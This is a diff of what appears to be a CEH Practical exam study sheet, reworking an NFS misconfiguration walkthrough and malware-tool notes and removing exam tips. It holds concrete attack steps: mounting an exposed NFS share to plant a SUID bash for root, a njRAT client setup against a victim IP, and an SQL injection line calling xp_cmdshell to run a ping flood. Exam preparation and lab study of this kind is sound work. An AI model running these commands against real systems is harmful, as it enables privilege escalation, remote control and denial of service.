@@ -292,16 +292,17 @@ to checks hosts up: `nmap -sn IP/Subnet`
 Exploiting misconfigured NFS (port 2049)
 
 * `nmap -sV —p 2049 IP/Subnet`
-* `sudo apt-get install nfs-common` (optional)
-* check available mounts: `showmount -e <Target_IP>`
+* `sudo apt-get install nfs-common`
 * `nmap -sV —script=nfs-showmount <Target_IP>`
+* check available mounts: `showmount -e <Target_IP>` -> we will see /home directory
 * `mkdir /tmp/nfs`
-* `sudo mount -t nfs <Target_IP>:/home/tmp/nfs`
+* `sudo mount -t nfs 10.10.1.9:/home /tmp/nfs`&#x20;
 * `cd /tmp/nfs`
 * `sudo cp /bin/bash .`
-* `sudo chmod +s bash`
+* `sudo chmod +s bash` -> it will be highlighted in red
 * `ls -la`
 * `sudo df -h`
+* `sudo chmod +s bash`&#x20;
 
 after them, In another terminal:
 
@@ -310,20 +311,6 @@ after them, In another terminal:
 * `cd /home`
 * `ls -la`
 * Find the flag: `find / -name "*.txt" -ls 2> /dev/null`
-
-or
-
-* `sudo apt-get install nfs-common`
-* `showmount -e 10.10.1.9` -> we will see /home directory
-* `mkdir /tmp/nfs`
-* `sudo mount -t nfs 10.10.1.9:/home /tmp/nfs`&#x20;
-* `cd /tmp/nfs`
-* `sudo cp /bin/bash`
-* `sudo chmod +s bash` -> it will be highlighted in red
-* login back to the target machine using ssh
-* `cd /home`
-* `ls` -> here we will have bash
-* `./bash -p`
 
 ## WireShark
 
@@ -723,14 +710,14 @@ get <filename>
 * Upload malware executable
 * See entry point address
 
-**PEView**
+#### **PEView**
 
 * Download PEView tool
 * Execute tool
 * Upload malware executable
 * Look for the "Optional Header" section within the PEView interface. In this section, you should find the "AddressOfEntryPoint" field, which represents the entry point of the executable. Note the hexadecimal value displayed in the "AddressOfEntryPoint" field. This is the entry point address of the executable.
 
-**Detect it easy**
+#### Detect it easy
 
 * Execute Detect it easy client tool
 * Upload malware executable
@@ -758,7 +745,7 @@ or we can use: **PE Explorer** tools
 * Set victim IP and relative ports to 6703 and 2968 (or custom port)
 * Click to connect and open file manger.
 
-NjRat
+#### **NjRat**
 
 * Execute NjRat
 * Insert IP and Port
@@ -1102,37 +1089,3 @@ blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
 {% embed url="https://adithyanak.gitbook.io/ceh-practical/" %}
 
 {% embed url="https://github.com/dhabaleshwar/CEHPractical" %}
-
-<details>
-
-<summary>Others</summary>
-
-### Tips <a href="#id-91e1" id="id-91e1"></a>
-
-_1) First finish linux based questions like nmap etc and save those in the desktop folder, believe me you will look into the nmap scans over and over again._\
-_2) Watch the ilab videos from youtube and reffer CEH practical Lab manual._\
-_3) Everything will be asked from the ilab videos nothing will be out of sylabus._\
-_4) Be Cool._
-
-The Username and Password file will be present in the parrot machine it will help you to crack the ftp and wordpress related questions.
-
-Don’t be nervous, you are going to pass the exam with no doubt. Patience is really needed for the exam because the parrot machine is outdated and its very slow.
-
-
-
-**Exam Experience:**
-
-I know this is the most awaited part. The exam is watched over by a person called a proctor. They use GoToMeeting, a program that sees and hears you through your computer. They'll also record what's on your screen during the whole exam. After your identity is verified, your exam starts.
-
-The exam is on a website called iLab. You don't need to worry about taking pictures of your virtual machines (VMs).
-
-You'll get two Operating systems to test things on. One is Parrot OS, and the other is Windows 7. No more Kali this time.&#x20;
-
-**You can DO** use the internet for the exam. You can look things up, take notes on your computer, watch videos, and read blogs. **But DON”T** write notes by hand, talk to people, or make calls.
-
-Your exam computers won't have regular internet access. You need to use your web browser to access the internet.
-
-* Start with the scanning part (NMAP Scan), since the scanning part takes some time, I moved on to other hacking questions.
-* Scan all ports on IPs because default scripts might not catch smart configurations.
-
-</details>
